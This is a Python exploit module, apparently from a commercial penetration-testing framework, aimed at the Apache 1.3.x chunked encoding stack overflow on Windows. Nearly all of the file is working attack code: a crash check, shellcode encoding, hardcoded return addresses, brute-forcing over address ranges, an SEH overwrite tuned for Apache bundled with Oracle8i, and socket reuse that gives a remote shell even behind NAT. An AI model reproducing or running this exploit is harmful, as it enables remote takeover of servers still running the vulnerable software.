#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


# CANVAS Apache 1.3.X - 1.3.24 chunked encoding exploit
#
# Bug class: Stack overflow
# 

import sys
if "." not in sys.path: sys.path.append(".")


import time

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from shellcode import win32shell
from win32Node import win32Node

# GUI info
NAME="Apache Chunk win32"
DESCRIPTION="Apache Chunked encoding exploit for win32"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apache"
DOCUMENTATION["Date public"] = "06/17/2002"
DOCUMENTATION["CVE Name"] = "CVE-2002-0392"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0392"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["CERT Advisory"] = "http://www.cert.org/advisories/CA-2002-17.html"
DOCUMENTATION["References"] = "http://www.apache.org"
DOCUMENTATION["Repeatability"] = "Multiple tries"
DOCUMENTATION["Notes"] = "Apache 1.3 through 1.3.24"

VERSION="0.5"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]
PROPERTY['AUTOHACK_EXCLUDE'] = True

NOTES="""
As requested.

The Apache chunked encoding attack turns into a trivial stack
overflow on win32 platforms. On the stack there is a SEH. We
overwrite this SEH and trigger an exception. Presto, owned.

DEVELOPMENT NOTES:

The attack:

Well this is hacking history. But I'll detail the, umm, details
of this attack for good form.

The Apache chunked vulnerability is based on Apache's handling of
chunked encoding. For Apache, chunks are blocks of data sent in
a [0xSIZE][DATA] form.

The bug is in ap_get_client_block() where there is a classic
"oh no I don't grasp signedness" issue in the form of something
like: len = (int_from_client > bufsize ? bufsize : int_from_client)

Because Apache uses signed integers in this routine, the comparison
between int_from_client and bufsize will merrily return int_from_client
even when it has it's signed bit set (ie: when it is negative).

In http_protocol.c this looks like:

...
len_to_read = (r->remaining > bufsiz) ? bufsiz : r->remaining;
len_read = ap_bread(r->connection->client, buffer, len_to_read);
...

Inside ap_bread() there are multiple calls to memcpy() which use
our supplied len_to_read as an argument. Now memcpy len args are
unsigned, so now our negative value becomes a huge value. This
memcpy() copies user supplied data into a stackbased buffer, and 
will copy well beyond bounds untill it hits "bad" memory.

From this point the specifics for exploitation differ. For win32
it becomes a trivial task, as on every new thread there will be
exception handlers on the stack, which contain info on where
to jump when an exception is raised.

Like..oh say... an exception such as memcpy() hitting "bad" memory.

Uh oh ;)

So we overwrite the SEH data on the stack with pointers to our opcode
and have memcpy continue it's operation into bad memory, raising
an exception, and as we owned the SEH data, this will cause execution
flow to jump into our opcode, making this one robust attack.

ADDITIONAL NOTES:
    
Oracle8i ships with a vulnerable Apache 1.3.12 for Win32 by default.
Yes you can own those with this exploit. Verified. However, we get
only one shot with Oracle Apaches it seems, so we have a regular 
jmp strategy for owning Oracle specific Apaches (Which you can test 
for). It has a bug in the respawning of the Apache child, so saddly
we can't brute. This issue was apparently addressed in one of the
metalink patches, but if the server's still running 1.3.12 we can
assume it's not likely they applied that patch either. So we put
in an additional attack strategy for single shot situations. 

"""

CHANGELOG="""
"""

# GUI run exploit

# NEW v0.4:
#
# - implemented the win32 socket recycling concept, this lets you recycle
# the exisiting socket for the payload interaction. In other words, yes you
# can hack through NAT, no more dependance on callbacks :)
#
# NEW v0.5:
#
# - restructured the layout of the different attacks and removed redundancy
# - incorporated an attack for single hit Oracle8i 1.3.12 Apaches
#   look at the new target layout to add and debug Oracle targets
#   versioning depends on having "Oracle" in the description
# - changed Test to check for Oracle Apaches, you can add specific banners


# known targets we try before going into a full on brute
# Apache 1.3.24 to 1.3.9 on win2k Pro
#
# some versions missing due to download availability
# some issues with starting as a service on lower versions
#
# the bruteforce should take care of anything this range doesn't hit
# ofcourse it's handy to add targets you get on succesfull brutes to
# this range, practical effectiveness superceeds theoretical beauty ;)
#
known = {
    0 : [
        # oracle9i apache 1.3.12
        0x01BAD270,
        # live target 1.3.24 behind NAT firewall, GO debug
        0x00848A47, 
        0x008394BF,
        0x00846BBF,
        0x008461BF,
        # XP Service 1.3.24 live testing
        0x00668DBF,
        0x00668DBF,
        0x00603AB0,
        0x00603AB0,
        # debugging GO code on 1.3.12
        0x004AA0BF,
        0x004A60EF,
        0x004A6041,
        0x004A7041,
        0x004A6841,
        0x004A8441, 
        0x004A6BBF,
        # 1.3.24 (service)
        0x005E4ABF,
        # 1.3.23, 1.3.20, 1.3.19 (manual)
        0x00846BBF,
        # 1.3.22, 1.3.20, 1.3.19, 1.3.17 (service)
        0x005C61BF,
        # 1.3.14 (manual)
        0x008461BF, 
        # 1.3.12 (manual)
        0x004A61BF,
        0x004A5441,
        # 1.3.11, 1.3.9 (manual)
        0x004A6841,
        #Dave's 1.3.12 manual startup
        0x00441418
        ]
        }

# name, startbrute, endbrute, brutestep
targets = {
    0 : ["Autoversioning N/A", 0x00000000, 0x00000000, 0x0000],
    1 : ["Apache, WIN32, 1.3.X - 1.3.24 likely brute range", 0x00404041, 0x40000000, (8192 / 4) / 2],
    2 : ["Apache, WIN32, 1.3.X - 1.3.24 full brute range", 0x00000041, 0x700000000, (8192 / 4) / 2],
    
# Oracle single hit targets

    # name, jmp ebx, offset (in dwords) for SE handler tag
    3 : ["Oracle 8i Apache 1.3.12 (Win2k Pro SP4, RPCRT4.DLL)", 0x77149353, 1184, 0],
    4 : ["Oracle-style Apache 1.3.24 (Win2k Pro SP4)", 0x77149353, 1881, -2]
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host = "192.168.0.6"
        self.port = 80
        
        # targets default version
        self.version = 1
        self.info, self.startbrute, self.endbrute, self.brutestep = targets[self.version]

        # shellcode place holders 
        self.shellcode = "A" * 1024
        self.stagetwo = "\xcc" * 1024
        self.badstring = "\x00\\/.:?\r\n%?\" "
        self.searchbadstring = self.badstring

        # check version, if enabled there will be a pedantic version check
        self.checkversion = 1

        # check crash, pedantic vuln check
        self.checkcrash = 1

        # toggle bruteforce
        self.brute = 1

        # bruteforce control flags
        self.brutehalt = 0
        self.brutequit = 0

        # max connect failures
        self.maxconnect = 12

        # used for done flag from commandline
        self.done = 0

        # covertness flag
        self.covertness = 0

        # is this an Oracle target?
        self.oracle = 0

        # searchcode tags
        self.tag1 = "BAAB"
        self.tag2 = "ABBA"
        
        self.align = 0
        return
    
    # satisfy API
    def neededListenerTypes(self):
        return []

    def connect_to_host(self, t_host, t_port):
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except:
            return 0
        return s

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        result = 0
        s = self.connect_to_host(self.host, self.port)
        if s == 0:
            return 0
        else:
            self.websend(s, "HEAD / HTTP/1.0\r\n\r\n")
            try:
                response = s.recv(512, 0)
            except:
                self.log("timeout on recv")
                return 0
            if response.count("Apache") and response.count("Win32"):
                print "Win32 Apache found, let's have a closer look"
                result = 1
                # check version
                if self.checkversion:
                    result = 0
                    # plain string comparison will lead to false positives
                    versions = { 0 : [ "1.3.0",  "1.3.1",  "1.3.2",  "1.3.3",
                                       "1.3.4",  "1.3.5",  "1.3.6",  "1.3.7",
                                       "1.3.8",  "1.3.9 ", "1.3.10", "1.3.11",
                                       "1.3.12", "1.3.13", "1.3.14", "1.3.15",
                                       "1.3.16", "1.3.17", "1.3.18", "1.3.19",
                                       "1.3.20", "1.3.21", "1.3.22", "1.3.23",
                                       "1.3.24" ] }
                    # kludge to prevent false positives for time being
                    notvuln = { 0 : [".25", ".26", ".27", ".28", ".29"] }
                    found = ""
                    for each in versions[0]:
                        if response.count(each):
                            found = each
                            result = 1
                    for each in notvuln[0]:
                        if response.count(each):
                            result = 0
                    if result:
                        self.log("Found vulnerable version: %s"% found)
                        s.close()
                    # check for oracle Apaches
                    if response.count("Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.22"):
                        self.log("Target is likely to be part of Oracle8i database")
                        # don't crash oracle apaches, 1 shot
                        self.oracle = 1
                    if self.checkcrash and result and self.covertness <= 3 and not self.oracle:
                        s = self.connect_to_host(self.host, self.port)
                        self.log("Checking for vulnerable Apache")
                        header = self.getHeader()
                        chunk = self.getChunk(0x01020304)
                        self.doRequest(s, header, chunk)
                        self.websend(s, "\r\n")
                        crash = ""
                        try:
                            crash = s.recv(256, 0)
                            result = 0
                        except:
                            self.log("Apache crashed, vulnerable")
                            result = 1
                            s.close()
                            
                return result
            else:
                self.log("Could not establish if target is Apache Win32")
                return 0
    
    # satisfy API (host, port not used here)
    def createShellcode(self):
        #if you want a callback...which you don't
        #host=self.callback.ip
        #port=self.callback.port
        from shellcode import shellcodeGenerator
        sc = shellcodeGenerator.win32()
        # GOFindSock and RecvExecWin32 are a match made in heaven
        sc.addAttr("GOFindSock", None)
        # RecvExec leaves active fd in esi 
        sc.addAttr("RecvExecWin32", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        # we might have to use searchcode for Oracle single shots
        self.shellcode = "\xeb\x08" + self.tag2 + self.tag1 + self.shellcode
        return self.shellcode
     
    def doRequest(self, s, header, chunk):
        try:
            self.websend(s, header)
        except:
            return 0
        # Go for the kill
        try:
            self.websend(s, chunk)
        except:
            return 0
        return 1
    
    def getHeader(self):
        pad = 3
        # shellcode repetitions
        screp = 24
        # main request
        header = "GET / HTTP/1.1\r\n"
        header += "Host: localh\r\n"
        self.log("Encoded shellcode len: %d bytes"% len(self.shellcode))
        for i in range(0, screp):
            header += "X-" + "P" * pad + ": "
            header += "A" * (2048 - len(self.shellcode) - (4 + pad))
            header += self.shellcode
            header += "\r\n"
        # chunky chunky
        header += "Transfer-Encoding: chunked\r\n\r\n"
        return header
       
    def getOracleChunk(self, retadd, seoffset, align):
        pad = 1
        orachunk = ""
        chunk = ""

        self.log("Building Oracle specific chunk")
        if pad:
            chunk += "%X\r\n"% pad
            chunk += "P" * pad
            chunk += "\r\n"
            diff = len(chunk)
        chunk += "FFFFFFF4"

        orachunk = "A" * (8192 - (8 + 2 + diff))
        # mix in searchcode for our main payload
        self.log("Building searchcode")
        searchcode = win32shell.getsearchcode(self.tag1, self.tag2)
        from encoder import addencoder
        encoder = addencoder.inteladdencoder()
        encoder.setbadstring(self.searchbadstring)
        searchcode = encoder.encode(searchcode)
        #searchcode = "\xcc" + searchcode
        # mix it in the sauce
        self.log("Adding searchcode")
        orachunk = stroverwrite(orachunk, searchcode, (((seoffset - 1) * 4)+align) - len(searchcode))

        # ebx points at the ptr to next SEH record that we own
        # we abuse this by using a jmp ebx addy and putting a
        # jmp in the SEH record ptr to jmp over the SE handler tag
        # and into a jmp back to some search shellcode for our main
        # payload
       
        # ebx will point at SEH next ptr, we jmp over the SE handler tag
        orachunk = stroverwrite(orachunk, "AA\xeb\x04", ((seoffset - 1) * 4)+align)
        # the actual SE handler tag
        orachunk = stroverwrite(orachunk, intel_order(retadd), (seoffset * 4)+align)
        # jmp to searchcode here (addl 0x600,%esp jmp %esp)
        orachunk = stroverwrite(orachunk, "\x81\xc4\x00\x06\x00\x00\xff\xe4", ((seoffset + 1) * 4)+align)
        
        """
        findme = 0x41424301
        for i in range(0, 2044):
            findme = self.sanitiseAdd(findme)
            print "offset i: %d %.8X"% (i, findme)
            orachunk = stroverwrite(orachunk, intel_order(findme), i * 4)
            findme = findme + 1
        
        """
        chunk += orachunk
        return chunk
        
    def getChunk(self, retadd):
        # both XP and Win2k pad is 1
        chunk = ""
        diff = 0
        pad = 1

        # padding for retadd align
        if pad:
            chunk += "%X\r\n"% pad
            chunk += "P" * pad
            chunk += "\r\n"
            diff = len(chunk)

        chunk += "FFFFFFF4"
        rep = (8192 - (8 + 2 + diff)) / 4

        for i in range(0, rep):
            chunk += intel_order(retadd)

        pad = 8192 - ((rep * 4) + (8 + 2 + diff))

        while pad > 0:
            chunk += "P"
            pad = pad - 1
         
        return chunk
    
    # we're in chunked mode, nul's not an issue
    def sanitiseAdd(self, retadd):
        a = (retadd >> 24) & 0xFF
        b = (retadd >> 16) & 0xFF
        c = (retadd >> 8)  & 0xFF
        d = retadd & 0xFF
        if a == 0x0D or a == 0x0A:
            retadd = retadd + 0x01000000
        if b == 0x0D or b == 0x0A:
            retadd = retadd + 0x00010000
        if c == 0x0D or c == 0x0A:
            retadd = retadd + 0x00000100
        if d == 0x0D or d == 0x0A:
            retadd = retadd + 0x00000001
        return retadd
    
    def snooze(self, seconds):
        self.log("Snoozing (%d seconds)"% seconds)
        while seconds:
            self.log("%.2d seconds left in snooze"% seconds)
            time.sleep(1)
            seconds = seconds - 1 
        return 1
    
    def doKnownRun(self, header):
        # try the known range first
        self.log("Trying known target range")
        # pedantic max connect, initial connect should work fine
        max = 5
        for retadd in known[0]:
            # the kill sock
            s = self.connect_to_host(self.host, self.port)
            if s == 0:
                self.log("Could not connect, retry")
                max = max - 1
                if not max:
                    self.log("Max attempt of connect failures reached, exiting")
                    self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
                    # free listener
                    self.setState("done")
                    return 0
            else:
                chunk = self.getChunk(retadd)
                self.log("Trying retadd: [0x%.8X]"% retadd)
                self.doRequest(s, header, chunk)
                self.websend(s, "\r\n")
                # error messages might have 'G' so we check for 'GOOO'
                if self.checkTriggerWin32(s, falsepositive=1):
                    self.log("Setting success flag")
                    self.setSucceeded()
                    import win32MosdefShellServer
                    node = win32Node()
                    node.parentnode = self.argsDict["passednodes"][0]
                    newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
                    self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
                    newshell.node.startup()
                    return newshell.node

  
                else:
                    s.close()
                     
        return 0
    
    def doOracleRun(self, header, oraret, seoffset, align):
        s = self.connect_to_host(self.host, self.port)
        if s == 0:
            self.log("Could not connect")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0
  
        chunk = self.getOracleChunk(oraret, seoffset, align)
        self.log("Trying single shot attack")
        self.doRequest(s, header, chunk)
        self.websend(s, "\r\n")
        
        # allow some time for searchcode
        self.snooze(5)
             
        if self.checkTriggerWin32(s, falsepositive=1):
            self.log("Setting success flag")
            import win32MosdefShellServer
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
            newshell.node.startup()
            return newshell.node

        else:
            s.close()
            
        # Oracle targets are single shot, we failed
        self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
        return 0
        
    def doBruteRun(self, header, startbrute, endbrute, brutestep):
        tries = endbrute - startbrute
        tries = tries / brutestep
        
        if not self.brute:
            tries = 1
            
        self.log("Tries: %d, Step: [0x%.8X], Range: [0x%.8X] to [0x%.8X]"% (tries, brutestep, startbrute, endbrute))

        max = self.maxconnect
        for i in range(0, tries):
            self.setProgress((float(i)/float(tries))*100)
            if self.getState() == self.HALT:
                self.log("Ending bruteforce run at [0x%.8X] after %d tries"% (startbrute, int(i)))
                self.setInfo("%s attacking %s:%d - done (aborted!)"% (NAME, self.host, self.port))
                return 0
            
            s = self.connect_to_host(self.host, self.port)
            if s == 0:
                self.log("could not connect, retry")
                max = max - 1
                if not max:
                    self.log("Max attempt of connect failures reached, exiting")
                    self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
                    return 0
                
                # give main apache some time to recover
                time.sleep(1)
                # adjust tries, this one doesn't counnt
                i = i - 1
            else:
                startbrute = self.sanitiseAdd(startbrute)
                chunk = self.getChunk(startbrute)
                self.log("Trying retadd: [0x%.8X]"% startbrute)
                self.doRequest(s, header, chunk)
                self.websend(s, "\r\n")
                
                if self.checkTriggerWin32(s, falsepositive=1):
                    self.log("Setting success flag")
                    self.setSucceeded()
                    import win32MosdefShellServer
                    node=win32Node()
                    node.parentnode=self.argsDict["passednodes"][0]
                    newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
                    self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
                    newshell.node.startup()
                    return newshell.node

 
                else:
                    s.close()
                 
                #We always always grab the socket - so this should never happen
                #if this triggers it implies we got a callback...which we don't do.
                #if self.ISucceeded() or self.done:
                #    self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
                #    self.log("Success at [0x%.8X]"%  startbrute)
                #    return 1
                
                startbrute = startbrute + brutestep
                
        # end of run, no success
        self.log("No success in brute run")
        return 0
            
            
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        
        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0
        
        self.info = targets[self.version][0]
        if self.info.count("Oracle"):
            self.oracle = 1
            self.info, self.oraret, self.seoffset, self.align = targets[self.version]
        else:
            self.info, self.startbrute, self.endbrute, self.brutestep = targets[self.version]
          
        # get our shellcode header, static
        header = self.getHeader()
        
        # before we try anything else, we see if we're in Oracle single tag mode
        if self.oracle:
            shell = self.doOracleRun(header, self.oraret, self.seoffset, self.align)
            if shell in [0, 1, None]:
                return 0
            else:
                return shell
        # try known range, if no success go into full brute
        shell = self.doKnownRun(header)
        if shell in [0, 1, None]:
            shell = self.doBruteRun(header, self.startbrute, self.endbrute, self.brutestep)
            if shell in [0, 1, None]:
                return 0
            else:
                return shell
        else:
            return shell
            
        self.log("All done")            
        return 0

    def usage(self):
        print "Usage: %s -v version -t host [ -p port ]"% sys.argv[0],
        print "Debug options:\n\t-T (toggle test mode on)\n\t-B (toggle bruteforce off)"
        i = 0
        print "Available versions:"
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
    
